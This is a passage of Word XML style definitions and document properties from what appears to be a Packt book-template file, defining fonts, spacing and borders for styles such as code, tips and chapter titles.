      <w:rFonts w:ascii="Lucida Console" w:hAnsi="Lucida Console" w:cs="Lucida Console"/>
      <w:b/>
      <w:color w:val="747959"/>
      <w:sz w:val="18"/>
      <w:szCs w:val="18"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="IconPACKT">
    <w:name w:val="Icon [PACKT]"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
      <w:sz w:val="22"/>
      <w:lang w:val="en-US" w:eastAsia="en-US"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="CommentSubjectChar">
    <w:name w:val="Comment Subject Char"/>
    <w:rsid w:val="00F83C8C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DocumentMapChar">
    <w:name w:val="Document Map Char"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:rFonts w:ascii="Tahoma" w:eastAsia="Times New Roman" w:hAnsi="Tahoma" w:cs="Tahoma"/>
      <w:bCs/>
      <w:sz w:val="16"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="FollowedHyperlink">
    <w:name w:val="FollowedHyperlink"/>
    <w:rsid w:val="00F83C8C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F83C8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F83C8C"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="140" w:line="288" w:lineRule="auto"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="List">
    <w:name w:val="List"/>
    <w:basedOn w:val="BodyText"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:rFonts w:cs="FreeSans"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Caption">
    <w:name w:val="caption"/>
    <w:basedOn w:val="Normal"/>
    <w:qFormat/>
    <w:rsid w:val="00F83C8C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F83C8C"/>
    <w:pPr>
      <w:suppressLineNumbers/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:cs="FreeSans"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="NoSpacing">
    <w:name w:val="No Spacing"/>
    <w:qFormat/>
    <w:rsid w:val="00F83C8C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NormalPACKT">
    <w:name w:val="Normal [PACKT]"/>
    <w:rsid w:val="00F83C8C"/>
    <w:pPr>
      <w:suppressAutoHyphens/>
      <w:spacing w:after="120"/>
    </w:pPr>
    <w:rPr>
      <w:sz w:val="22"/>
      <w:szCs w:val="24"/>
      <w:lang w:eastAsia="zh-CN"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="BulletPACKT">
    <w:name w:val="Bullet [PACKT]"/>
    <w:basedOn w:val="NormalPACKT"/>
    <w:rsid w:val="00F83C8C"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="num" w:pos="0"/>
        <w:tab w:val="left" w:pos="360"/>
      </w:tabs>
      <w:spacing w:after="60"/>
      <w:ind w:left="720" w:right="360"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="NumberedBulletPACKT">
    <w:name w:val="Numbered Bullet [PACKT]"/>
    <w:basedOn w:val="BulletPACKT"/>
    <w:rsid w:val="00F83C8C"/>
    <w:pPr>
      <w:ind w:hanging="363"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="CommentText">
    <w:name w:val="annotation text"/>
    <w:basedOn w:val="Normal"/>
    <w:rsid w:val="00F83C8C"/>
    <w:pPr>
      <w:spacing w:after="160"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Times New Roman"/>
      <w:bCs w:val="0"/>
      <w:szCs w:val="20"/>
      <w:lang w:val="en-GB"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="BalloonText">
    <w:name w:val="Balloon Text"/>
    <w:basedOn w:val="Normal"/>
    <w:rsid w:val="00F83C8C"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Tahoma" w:hAnsi="Tahoma" w:cs="Times New Roman"/>
      <w:sz w:val="16"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Footer">
    <w:name w:val="footer"/>
    <w:basedOn w:val="Normal"/>
    <w:rsid w:val="00F83C8C"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="center" w:pos="4320"/>
        <w:tab w:val="right" w:pos="8640"/>
      </w:tabs>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:cs="Times New Roman"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListParagraph">
    <w:name w:val="List Paragraph"/>
    <w:basedOn w:val="Normal"/>
    <w:qFormat/>
    <w:rsid w:val="00F83C8C"/>
    <w:pPr>
      <w:ind w:left="720"/>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="QuotePACKT">
    <w:name w:val="Quote [PACKT]"/>
    <w:basedOn w:val="NormalPACKT"/>
    <w:rsid w:val="00F83C8C"/>
    <w:pPr>
      <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
      <w:spacing w:before="180" w:after="180"/>
      <w:ind w:left="432" w:right="432"/>
    </w:pPr>
    <w:rPr>
      <w:i/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="HTMLPreformatted">
    <w:name w:val="HTML Preformatted"/>
    <w:basedOn w:val="Normal"/>
    <w:rsid w:val="00F83C8C"/>
    <w:pPr>
      <w:spacing w:after="0"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Times New Roman"/>
      <w:bCs w:val="0"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="ChapterTitlePACKT">
    <w:name w:val="Chapter Title [PACKT]"/>
    <w:next w:val="NormalPACKT"/>
    <w:rsid w:val="00F83C8C"/>
    <w:pPr>
      <w:suppressAutoHyphens/>
      <w:spacing w:after="840"/>
      <w:jc w:val="right"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
      <w:bCs/>
      <w:color w:val="000000"/>
      <w:kern w:val="1"/>
      <w:sz w:val="56"/>
      <w:szCs w:val="32"/>
      <w:lang w:val="en-GB" w:eastAsia="zh-CN"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="CodePACKT">
    <w:name w:val="Code [PACKT]"/>
    <w:basedOn w:val="NormalPACKT"/>
    <w:rsid w:val="00F83C8C"/>
    <w:pPr>
      <w:spacing w:after="50"/>
      <w:ind w:left="360"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Lucida Console" w:hAnsi="Lucida Console" w:cs="Lucida Console"/>
      <w:sz w:val="19"/>
      <w:szCs w:val="18"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="InformationBoxPACKT">
    <w:name w:val="Information Box [PACKT]"/>
    <w:basedOn w:val="NormalPACKT"/>
    <w:next w:val="NormalPACKT"/>
    <w:rsid w:val="00F83C8C"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  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
      <w:spacing w:before="180" w:after="180"/>
      <w:ind w:left="720" w:right="720"/>
    </w:pPr>
    <w:rPr>
      <w:sz w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="TableColumnHeadingPACKT">
    <w:name w:val="Table Column Heading [PACKT]"/>
    <w:basedOn w:val="NormalPACKT"/>
    <w:rsid w:val="00F83C8C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next w:val="NormalPACKT"/>
    <w:rsid w:val="00F83C8C"/>
    <w:pPr>
      <w:spacing w:after="120"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="TableColumnContentPACKT">
    <w:name w:val="Table Column Content [PACKT]"/>
    <w:basedOn w:val="TableColumnHeadingPACKT"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:b w:val="0"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="CommandLinePACKT">
    <w:name w:val="Command Line [PACKT]"/>
    <w:basedOn w:val="CodePACKT"/>
    <w:rsid w:val="00F83C8C"/>
    <w:pPr>
      <w:spacing w:after="60"/>
      <w:ind w:left="0"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="CodeWithinTipPACKT">
    <w:name w:val="Code Within Tip [PACKT]"/>
    <w:rsid w:val="00F83C8C"/>
    <w:pPr>
      <w:pBdr>
        <w:top w:val="double" w:sz="4" w:space="6" w:color="000000"/>
        <w:bottom w:val="double" w:sz="4" w:space="9" w:color="000000"/>
      </w:pBdr>
      <w:suppressAutoHyphens/>
      <w:spacing w:after="50"/>
      <w:ind w:left="720" w:right="720"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Lucida Console" w:hAnsi="Lucida Console" w:cs="Lucida Console"/>
      <w:sz w:val="19"/>
      <w:lang w:eastAsia="zh-CN"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="ChapterNumberPACKT">
    <w:name w:val="Chapter Number [PACKT]"/>
    <w:next w:val="ChapterTitlePACKT"/>
    <w:rsid w:val="00F83C8C"/>
    <w:pPr>
      <w:suppressAutoHyphens/>
      <w:jc w:val="right"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
      <w:bCs/>
      <w:color w:val="000000"/>
      <w:kern w:val="1"/>
      <w:sz w:val="120"/>
      <w:szCs w:val="32"/>
      <w:lang w:val="en-GB" w:eastAsia="zh-CN"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="BulletEndPACKT">
    <w:name w:val="Bullet End [PACKT]"/>
    <w:basedOn w:val="BulletPACKT"/>
    <w:next w:val="NormalPACKT"/>
    <w:rsid w:val="00F83C8C"/>
    <w:pPr>
      <w:spacing w:after="120"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="FigurePACKT">
    <w:name w:val="Figure [PACKT]"/>
    <w:rsid w:val="00F83C8C"/>
    <w:pPr>
      <w:suppressAutoHyphens/>
      <w:spacing w:before="240" w:after="240"/>
      <w:jc w:val="center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NumberedBulletEndPACKT">
    <w:name w:val="Numbered Bullet End [PACKT]"/>
    <w:basedOn w:val="NumberedBulletPACKT"/>
    <w:next w:val="NormalPACKT"/>
    <w:rsid w:val="00F83C8C"/>
    <w:pPr>
      <w:spacing w:after="120"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="BulletWithinBulletPACKT">
    <w:name w:val="Bullet Within Bullet [PACKT]"/>
    <w:basedOn w:val="BulletPACKT"/>
    <w:rsid w:val="00F83C8C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rsid w:val="00F83C8C"/>
    <w:pPr>
      <w:spacing w:after="120"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="TipPACKT">
    <w:name w:val="Tip [PACKT]"/>
    <w:basedOn w:val="InformationBoxPACKT"/>
    <w:next w:val="NormalPACKT"/>
    <w:rsid w:val="00F83C8C"/>
    <w:pPr>
      <w:pBdr>
        <w:top w:val="double" w:sz="4" w:space="6" w:color="000000"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="double" w:sz="4" w:space="9" w:color="000000"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:pBdr>
      <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="TableWithinBulletPACKT">
    <w:name w:val="Table Within Bullet [PACKT]"/>
    <w:basedOn w:val="TableColumnContentPACKT"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="TipWithinBulletPACKT">
    <w:name w:val="Tip Within Bullet [PACKT]"/>
    <w:basedOn w:val="TableWithinBulletPACKT"/>
    <w:rsid w:val="00F83C8C"/>
    <w:pPr>
      <w:pBdr>
        <w:top w:val="double" w:sz="4" w:space="6" w:color="000000"/>
        <w:bottom w:val="double" w:sz="4" w:space="9" w:color="000000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rsid w:val="00F83C8C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TitlePACKT">
    <w:name w:val="Part Title [PACKT]"/>
    <w:basedOn w:val="PartPACKT"/>
    <w:rsid w:val="00F83C8C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rsid w:val="00F83C8C"/>
    <w:pPr>
      <w:spacing w:after="120"/>
    </w:pPr>
    <w:rPr>
      <w:bCs/>
      <w:szCs w:val="20"/>
      <w:lang w:eastAsia="en-US"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="CodeWithinBulletsPACKT">
    <w:name w:val="Code Within Bullets [PACKT]"/>
    <w:basedOn w:val="CodePACKT"/>
    <w:rsid w:val="00F83C8C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rsid w:val="00F83C8C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rsid w:val="00F83C8C"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="clear" w:pos="0"/>
        <w:tab w:val="num" w:pos="360"/>
      </w:tabs>
      <w:ind w:left="1463" w:hanging="386"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="NumberedBulletWithinBulletEndPACKT">
    <w:name w:val="Numbered Bullet Within Bullet End [PACKT]"/>
    <w:basedOn w:val="NumberedBulletWithinBulletPACKT"/>
    <w:rsid w:val="00F83C8C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rsid w:val="00F83C8C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rsid w:val="00F83C8C"/>
    <w:pPr>
      <w:spacing w:after="120"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="CodeWithinInformationBoxPACKT">
    <w:name w:val="Code Within Information Box [PACKT]"/>
    <w:basedOn w:val="CodeWithinTipPACKT"/>
    <w:rsid w:val="00F83C8C"/>
    <w:pPr>
      <w:pBdr>
        <w:top w:val="single" w:sz="6" w:space="6" w:color="000000"/>
        <w:left w:val="single" w:sz="6" w:space="4" w:color="000000"/>
        <w:bottom w:val="single" w:sz="6" w:space="9" w:color="000000"/>
        <w:right w:val="single" w:sz="6" w:space="4" w:color="000000"/>
      </w:pBdr>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="LayoutInformationPACKT">
    <w:name w:val="Layout Information [PACKT]"/>
    <w:basedOn w:val="NormalPACKT"/>
    <w:next w:val="NormalPACKT"/>
    <w:rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
      <w:b/>
      <w:color w:val="FF0000"/>
      <w:sz w:val="28"/>
      <w:szCs w:val="28"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="FigureWithinBulletPACKT">
    <w:name w:val="Figure Within Bullet [PACKT]"/>
    <w:basedOn w:val="FigurePACKT"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="FigureWithinInformationBoxPACKT">
    <w:name w:val="Figure Within Information Box [PACKT]"/>
    <w:basedOn w:val="FigureWithinBulletPACKT"/>
    <w:rsid w:val="00F83C8C"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  <w:spacing w:before="0"/>
      <w:ind w:left="720" w:right="720"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="FigureWithinTableContentPACKT">
    <w:name w:val="Figure Within Table Content [PACKT]"/>
    <w:basedOn w:val="FigureWithinInformationBoxPACKT"/>
    <w:rsid w:val="00F83C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rsid w:val="00F83C8C"/>
    <w:pPr>
      <w:pBdr>
        <w:top w:val="double" w:sz="4" w:space="6" w:color="000000"/>
        <w:bottom w:val="double" w:sz="4" w:space="9" w:color="000000"/>
      </w:pBdr>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="IgnorePACKT">
    <w:name w:val="Ignore [PACKT]"/>
    <w:basedOn w:val="FigureWithinTipPACKT"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="InformationBoxWithinBulletPACKT">
    <w:name w:val="Information Box Within Bullet [PACKT]"/>
    <w:basedOn w:val="InformationBoxPACKT"/>
    <w:rsid w:val="00F83C8C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rsid w:val="00F83C8C"/>
    <w:pPr>
      <w:spacing w:after="60"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="BulletWithinTipPACKT">
    <w:name w:val="Bullet Within Tip [PACKT]"/>
    <w:basedOn w:val="BulletWithinInformationBoxPACKT"/>
    <w:rsid w:val="00F83C8C"/>
    <w:pPr>
      <w:pBdr>
        <w:top w:val="double" w:sz="4" w:space="6" w:color="000000"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="double" w:sz="4" w:space="9" w:color="000000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rsid w:val="00F83C8C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rsid w:val="00F83C8C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rsid w:val="00F83C8C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rsid w:val="00F83C8C"/>
    <w:pPr>
      <w:spacing w:after="120"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="CommandLineWithinTipPACKT">
    <w:name w:val="Command Line Within Tip [PACKT]"/>
    <w:basedOn w:val="CommandLinePACKT"/>
    <w:rsid w:val="00F83C8C"/>
    <w:pPr>
      <w:pBdr>
        <w:top w:val="double" w:sz="4" w:space="6" w:color="000000"/>
        <w:bottom w:val="double" w:sz="4" w:space="9" w:color="000000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rsid w:val="00F83C8C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rsid w:val="00F83C8C"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rsid w:val="00F83C8C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rsid w:val="00F83C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rsid w:val="00F83C8C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rsid w:val="00F83C8C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rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="QuoteWithinBulletPACKT">
    <w:name w:val="Quote Within Bullet [PACKT]"/>
    <w:basedOn w:val="QuotePACKT"/>
    <w:rsid w:val="00F83C8C"/>
    <w:pPr>
      <w:ind w:left="864" w:right="864"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="RomanNumberedBulletPACKT">
    <w:name w:val="Roman Numbered Bullet [PACKT]"/>
    <w:basedOn w:val="NumberedBulletPACKT"/>
    <w:rsid w:val="00F83C8C"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="clear" w:pos="0"/>
      </w:tabs>
      <w:ind w:left="1304" w:right="0" w:hanging="227"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="RomanNumberedBulletEndPACKT">
    <w:name w:val="Roman Numbered Bullet End [PACKT]"/>
    <w:basedOn w:val="RomanNumberedBulletPACKT"/>
    <w:rsid w:val="00F83C8C"/>
    <w:pPr>
      <w:spacing w:after="120"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="FigureCaptionPACKT">
    <w:name w:val="Figure Caption [PACKT]"/>
    <w:basedOn w:val="FigurePACKT"/>
    <w:rsid w:val="00F83C8C"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="120"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="AlphabeticalBulletPACKT">
    <w:name w:val="Alphabetical Bullet [PACKT]"/>
    <w:basedOn w:val="Normal"/>
    <w:rsid w:val="00F83C8C"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="num" w:pos="0"/>
        <w:tab w:val="left" w:pos="360"/>
      </w:tabs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rsid w:val="00F83C8C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rsid w:val="00F83C8C"/>
    <w:rPr>
      <w:sz w:val="46"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="BulletWithinTableColumnContentPACKT">
    <w:name w:val="Bullet Within Table Column Content [PACKT]"/>
    <w:basedOn w:val="BulletPACKT"/>
    <w:rsid w:val="00F83C8C"/>
    <w:pPr>
      <w:ind w:left="432" w:right="72"/>
    </w:pPr>
    <w:rPr>
      <w:sz w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="BulletWithinTableColumnContentEndPACKT">
    <w:name w:val="Bullet Within Table Column Content End [PACKT]"/>
    <w:basedOn w:val="BulletWithinTableColumnContentPACKT"/>
    <w:rsid w:val="00F83C8C"/>
    <w:pPr>
      <w:spacing w:after="120"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="PartHeadingPACKT">
    <w:name w:val="Part Heading [PACKT]"/>
    <w:basedOn w:val="ChapterTitlePACKT"/>
    <w:rsid w:val="00F83C8C"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="BulletWithoutBulletWithinBulletPACKT">
    <w:name w:val="Bullet Without Bullet Within Bullet [PACKT]"/>
    <w:basedOn w:val="BulletPACKT"/>
    <w:rsid w:val="00F83C8C"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="clear" w:pos="0"/>
        <w:tab w:val="left" w:pos="720"/>
      </w:tabs>
      <w:autoSpaceDE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rsid w:val="00F83C8C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rsid w:val="00F83C8C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rsid w:val="00F83C8C"/>
    <w:pPr>
      <w:spacing w:after="173"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="AppendixTitlePACKT">
    <w:name w:val="Appendix Title [PACKT]"/>
    <w:basedOn w:val="NormalPACKT"/>
    <w:rsid w:val="00F83C8C"/>
    <w:pPr>
      <w:autoSpaceDE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paragraph" w:styleId="CommentSubject">
    <w:name w:val="annotation subject"/>
    <w:basedOn w:val="CommentText"/>
    <w:next w:val="CommentText"/>
    <w:rsid w:val="00F83C8C"/>
    <w:pPr>
      <w:spacing w:after="60"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
      <w:b/>
      <w:bCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="DocumentMap">
    <w:name w:val="Document Map"/>
    <w:basedOn w:val="Normal"/>
    <w:rsid w:val="00F83C8C"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Tahoma" w:hAnsi="Tahoma" w:cs="Times New Roman"/>
      <w:sz w:val="16"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Revision">
    <w:name w:val="Revision"/>
    <w:rsid w:val="00F83C8C"/>
    <w:pPr>
      <w:suppressAutoHyphens/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
      <w:bCs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%20Related%20Documents\CDE%20Training%20Docs\Editor%20Templates\269_NEW%20TEMPLATE_Cookbook_10p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269_NEW TEMPLATE_Cookbook_10pt.dot</Template>
  <TotalTime>1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Tajinder</dc:creator>
  <cp:lastModifiedBy>Tajinder</cp:lastModifiedBy>
  <cp:revision>4</cp:revision>
  <cp:lastPrinted>1601-01-01T00:00:00Z</cp:lastPrinted>
  <dcterms:created xsi:type="dcterms:W3CDTF">2016-03-22T15:54:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2016-03-22T16:23:00Z</dcterms:modified>
</cp:coreProperties>
</file>